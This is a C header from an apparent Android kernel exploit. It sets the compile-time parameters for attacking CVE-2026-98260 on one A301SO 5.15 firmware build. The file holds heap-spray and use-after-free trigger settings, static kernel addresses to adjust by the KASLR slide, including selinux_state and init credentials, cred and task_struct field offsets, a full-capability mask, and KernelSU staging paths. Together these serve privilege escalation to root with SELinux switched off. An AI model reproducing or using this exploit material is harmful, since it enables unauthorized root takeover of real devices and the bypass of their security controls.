#ifndef GHOSTLOCK_BACKENDS_98260_TIMER_A301SO_515_PARAMS_H
#define GHOSTLOCK_BACKENDS_98260_TIMER_A301SO_515_PARAMS_H

/**
 * @file a301so_515_params.h
 * @brief A301SO 5.15.189 compile-time experiment authority for CVE-2026-98260.
 *
 * @note Every target ABI value below was recovered from the exact
 *       67.2.A.3.178 boot image (SHA-256
 *       5f250c28ecee017fb956180a93a1fc6a22dedb6ecaaad7a6c0f513d3dc202027),
 *       its embedded BTF/kallsyms, exact disassembly, or the matching cold
 *       device slab geometry. Runtime discoveries such as KASLR slide, event
 *       ids, PFNs and the linear-map base deliberately remain runtime state.
 */

#if !defined(GLK98260_TARGET_A301SO_515)
#error "CVE-2026-98260 helper requires the explicit A301SO 5.15 target selector"
#endif

#define GLK98260_TARGET_ID "A301SO-5.15.189-67.2.A.3.178"
#define GLK98260_PARAM_REVISION "a301so-515-r7"
#define GLK98260_KSU_KMI "android13-5.15"
#define GLK98260_KSUD_PATH "/data/local/tmp/gl98260-ksud"
#define GLK98260_KSU_PREPARE_SCRIPT_PATH \
    "/data/local/tmp/gl98260-ksu-prepare.sh"

/**
 * @brief Trigger prerequisite recovered from exact exec_mmap disassembly.
 * @note A301SO uses non-killable mmap_read_lock; the 6.1+ upstream trigger
 *       requires mmap_read_lock_killable so SIGKILL can abort exec_mmap before
 *       posix_cpu_timers_exit dequeues the victim timerqueue node.
 */
#define GLK98260_EXEC_MMAP_HAS_KILLABLE_MMAP_LOCK 0
#define GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP 1

/** @brief Tracefs and scheduling parameters for the single-device experiment. */
#define GLK98260_TRACEFS "/sys/kernel/tracing"
#define GLK98260_TRIGGER_CPU 2
#define GLK98260_TRACE_CPU_COUNT 8
#define GLK98260_TIMER_COUNT 4096
#define GLK98260_VICTIM_INDEX 2048
#define GLK98260_PREFILL_TIMER_COUNT 4096
#define GLK98260_VMA_COUNT 50000
#define GLK98260_HELPER_STACK_BYTES (1U << 20)
#define GLK98260_LOCKER_COUNT 3
#define GLK98260_LOCKER_CPU_A 1
#define GLK98260_LOCKER_CPU_B 3
#define GLK98260_SOCKBUF_BYTES 8192U
#define GLK98260_SPRAY_THREADS 8
#define GLK98260_SPRAY_SOCKS 2048
#define GLK98260_SPRAY_PRE_WRITES 2000
#define GLK98260_SPRAY_POST_WRITES 10000
#define GLK98260_SOCKET_ACCOUNTING_FACTOR 2U
#define GLK98260_REAL_WRITE_STAGE_COUNT 1U
#define GLK98260_FAKE_WRITE_STAGE_COUNT 5U
#define GLK98260_EXPECTED_SHELL_ID 2000U
#define GLK98260_REAL_WRITE_VERIFY_ATTEMPTS 3U
#define GLK98260_STAGE_WRITE_ATTEMPTS 3U
#define GLK98260_CHILD_REPORT_TIMEOUT_MS 10000
#define GLK98260_TRACE_BUFFER_KB 4096U
#define GLK98260_CHILD_COMMAND_VERIFY 'V'
#define GLK98260_CHILD_COMMAND_COMMIT 'C'
#define GLK98260_CORE_LIMIT_BYTES (1ULL << 20)
#define GLK98260_COREDUMP_CPU 0
#define GLK98260_CORE_GO_SENTINEL 100
#define GLK98260_CORE_RAISE_SENTINEL 101
#define GLK98260_CORE_PRE_EXEC_SPINS 5000000UL
#define GLK98260_CORE_POST_RAISE_SPINS 100000UL

/** @brief Target page and posix_timers_cache geometry. */
#define GLK98260_PAGE_SHIFT 12U
#define GLK98260_PAGE_SIZE (1UL << GLK98260_PAGE_SHIFT)
#define GLK98260_TIMER_SLAB_ORDER 1U
#define GLK98260_TIMER_SLAB_BYTES \
    (GLK98260_PAGE_SIZE << GLK98260_TIMER_SLAB_ORDER)
#define GLK98260_TIMER_SLAB_MASK (GLK98260_TIMER_SLAB_BYTES - 1ULL)
#define GLK98260_TIMER_SLAB_PFN_MASK \
    ((1ULL << GLK98260_TIMER_SLAB_ORDER) - 1ULL)
#define GLK98260_TIMER_OBJECT_REQ 0x108ULL
#define GLK98260_TIMER_OBJECT_ALLOC 0x108ULL
#define GLK98260_TIMER_NODE_OFF 0x78ULL
#define GLK98260_TIMER_OBJECTS_PER_SLAB 31U

/** @brief Exact return addresses recorded as kmem_cache_alloc call_site. */
#define GLK98260_TIMER_ALLOC_SITE_STATIC 0xffffffc00827e850ULL
#define GLK98260_TIMER_ALLOC_SITE_LOW21 0x7e850ULL
#define GLK98260_TASK_ALLOC_SITE_STATIC 0xffffffc008132a60ULL
#define GLK98260_TASK_ALLOC_SITE_LOW21 0x132a60ULL
#define GLK98260_CRED_ALLOC_SITE_STATIC 0xffffffc00818ae7cULL
#define GLK98260_CRED_ALLOC_SITE_LOW21 0x18ae7cULL
#define GLK98260_TRACE_SITE_LOW_MASK 0x1fffffULL

/** @brief A301SO task_struct and cred allocation/layout facts from embedded BTF. */
#define GLK98260_TASK_OBJECT_REQ 0x1200ULL
#define GLK98260_TASK_OBJECT_ALLOC 0x1200ULL
#define GLK98260_TASK_CRED_OFF 0x798ULL
#define GLK98260_TASK_REAL_CRED_OFF 0x790ULL
#define GLK98260_CRED_OBJECT_REQ 0xb0ULL
#define GLK98260_CRED_OBJECT_ALLOC 0xc0ULL
#define GLK98260_CRED_USAGE_OFF 0x00ULL
#define GLK98260_CRED_UID_OFF 0x04ULL
#define GLK98260_CRED_GID_OFF 0x08ULL
#define GLK98260_CRED_SUID_OFF 0x0cULL
#define GLK98260_CRED_SGID_OFF 0x10ULL
#define GLK98260_CRED_EUID_OFF 0x14ULL
#define GLK98260_CRED_EGID_OFF 0x18ULL
#define GLK98260_CRED_FSUID_OFF 0x1cULL
#define GLK98260_CRED_FSGID_OFF 0x20ULL
#define GLK98260_CRED_SECUREBITS_OFF 0x24ULL
#define GLK98260_CRED_CAPS_OFF 0x28ULL
#define GLK98260_CRED_CAPS_COUNT 5U
#define GLK98260_CRED_CAP_INHERITABLE_OFF 0x28ULL
#define GLK98260_CRED_CAP_PERMITTED_OFF 0x30ULL
#define GLK98260_CRED_CAP_EFFECTIVE_OFF 0x38ULL
#define GLK98260_CAP_SYS_MODULE_NR 16U
#define GLK98260_CAP_SYS_MODULE_MASK 0x10000ULL
#define GLK98260_CRED_SECURITY_OFF 0x78ULL
#define GLK98260_CRED_USER_OFF 0x80ULL
#define GLK98260_CRED_USER_NS_OFF 0x88ULL
#define GLK98260_CRED_UCOUNTS_OFF 0x90ULL
#define GLK98260_CRED_GROUP_INFO_OFF 0x98ULL
#define GLK98260_FULLCAP 0x1ffffffffffULL

/** @brief rb_node overlay written through the stale timerqueue_node. */
#define GLK98260_RB_PARENT_COLOR_OFF 0x00ULL
#define GLK98260_RB_RIGHT_OFF 0x08ULL
#define GLK98260_RB_LEFT_OFF 0x10ULL
#define GLK98260_REFCOUNT_MIN 2U
#define GLK98260_REFCOUNT_MAX 0x7fffffffU

/** @brief Exact link-time data symbols; add the runtime KASLR slide before use. */
#define GLK98260_SELINUX_STATE_STATIC 0xffffffc00adaad88ULL
#define GLK98260_SELINUX_ENFORCING_OFF 0x00ULL
#define GLK98260_SELINUX_ZERO_WRITE_BIAS 7ULL
#define GLK98260_PANIC_ON_WARN_STATIC 0xffffffc00aafadd0ULL
/** @brief init_cred.user points to ext_root_user, not the root_user variable. */
#define GLK98260_ROOT_USER_STATIC 0xffffffc00ab23a80ULL
#define GLK98260_INIT_USER_NS_STATIC 0xffffffc00acce110ULL
#define GLK98260_INIT_UCOUNTS_STATIC 0xffffffc00ab23ff0ULL
#define GLK98260_INIT_GROUPS_STATIC 0xffffffc00ab23b28ULL

/** @brief A301SO 5.15 task_security_struct layout. */
#define GLK98260_SECURITY_BLOB_BYTES 0x18ULL
#define GLK98260_SECURITY_BLOB_RESERVE 0x40ULL
#define GLK98260_SECURITY_BLOB_CANDIDATE_0 0x1f00ULL
#define GLK98260_SECURITY_BLOB_CANDIDATE_1 0x1000ULL
#define GLK98260_SECURITY_BLOB_CANDIDATE_2 0x1800ULL
#define GLK98260_SECURITY_BLOB_CANDIDATE_3 0x0800ULL
#define GLK98260_SECURITY_BLOB_CANDIDATE_4 0x0100ULL
#define GLK98260_SECURITY_BLOB_CANDIDATE_5 0x0000ULL
#define GLK98260_SECURITY_OSID_OFF 0x00ULL
#define GLK98260_SECURITY_SID_OFF 0x04ULL
#define GLK98260_SELINUX_SID_KERNEL 1U

/**
 * @brief A301SO PFN-to-virtual conversion base and 39-bit linear-map window.
 * @note The conversion base is PAGE_OFFSET minus the physical RAM base; the
 *       leak gate measured it independently as 0xffffff7f80000000.
 */
#define GLK98260_EXPECTED_PFN_TO_VIRT_BASE 0xffffff7f80000000ULL
#define GLK98260_DIRECT_MAP_MIN 0xffffff8000000000ULL
#define GLK98260_DIRECT_MAP_MAX 0xffffffc000000000ULL

/** @brief Raw ring-buffer record layout used by this Android 5.15 trace ABI. */
#define GLK98260_TRACE_SCAN_STRIDE 4U
#define GLK98260_TRACE_ALLOC_PID_BEFORE_SITE 4U
#define GLK98260_TRACE_ALLOC_PTR_AFTER_SITE 8U
#define GLK98260_TRACE_ALLOC_REQ_AFTER_SITE 16U
#define GLK98260_TRACE_ALLOC_SIZE_AFTER_SITE 24U
#define GLK98260_TRACE_CRED_PID_BEFORE_PTR 12U
#define GLK98260_TRACE_CRED_SITE_BEFORE_PTR 8U
#define GLK98260_TRACE_EVENT_TYPE_BEFORE_PTR 16U
#define GLK98260_TRACE_CRED_REQ_AFTER_PTR 8U
#define GLK98260_TRACE_CRED_SIZE_AFTER_PTR 16U
#define GLK98260_TRACE_PAGE_TYPE_BEFORE_PFN 8U
#define GLK98260_TRACE_PAGE_PID_BEFORE_PFN 4U
#define GLK98260_TRACE_PAGE_ORDER_AFTER_PFN 8U
#define GLK98260_TRACE_PFN_LIMIT (1ULL << 26)

_Static_assert(GLK98260_TIMER_OBJECT_REQ == 0x108ULL,
               "A301SO k_itimer BTF size drifted");
_Static_assert(GLK98260_TIMER_NODE_OFF + GLK98260_RB_LEFT_OFF + 8ULL <=
                   GLK98260_TIMER_OBJECT_REQ,
               "timerqueue rb_node must fit k_itimer");
_Static_assert(GLK98260_CRED_CAPS_OFF +
                       GLK98260_CRED_CAPS_COUNT * 8ULL <=
                   GLK98260_CRED_SECURITY_OFF,
               "capability fields must end before cred security");
_Static_assert(GLK98260_CRED_GROUP_INFO_OFF + 8ULL <=
                   GLK98260_CRED_OBJECT_REQ,
               "cred reference fields must fit the BTF size");
_Static_assert(GLK98260_TASK_CRED_OFF + 8ULL <= GLK98260_TASK_OBJECT_REQ,
               "task cred pointer must fit task_struct");
_Static_assert(GLK98260_EXEC_MMAP_HAS_KILLABLE_MMAP_LOCK == 0 ||
                   GLK98260_EXEC_MMAP_HAS_KILLABLE_MMAP_LOCK == 1,
               "exec_mmap trigger prerequisite must be boolean");
_Static_assert(GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP == 0 ||
                   GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP == 1,
               "core_state trigger prerequisite must be boolean");
_Static_assert(GLK98260_SECURITY_SID_OFF + 4ULL <=
                   GLK98260_SECURITY_BLOB_BYTES,
               "SELinux SID must fit task_security_struct");

#endif
